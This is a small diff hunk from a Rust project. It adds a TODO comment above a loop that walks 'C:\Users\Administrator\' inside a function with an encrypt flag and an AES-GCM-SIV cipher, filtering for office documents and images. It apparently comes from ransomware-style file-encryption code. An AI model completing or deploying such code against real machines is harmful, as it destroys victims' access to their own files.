@@ -125,6 +125,7 @@ fn traverse(do_encrypt: bool, cipher: &mut Aes256GcmSiv) -> Result<(), Error> {
         "txt", "pdf", "docx", "doc", "pptx", "ppt", "xlsx", "xls", "png", "jpg", "jpeg",
     ];
 
+    //TODO: do NOT change the directory of this yet for safety reasons 
     for entry in WalkDir::new("C:\\Users\\Administrator\\").follow_links(true) {
         match entry {
             Ok(entry) => {
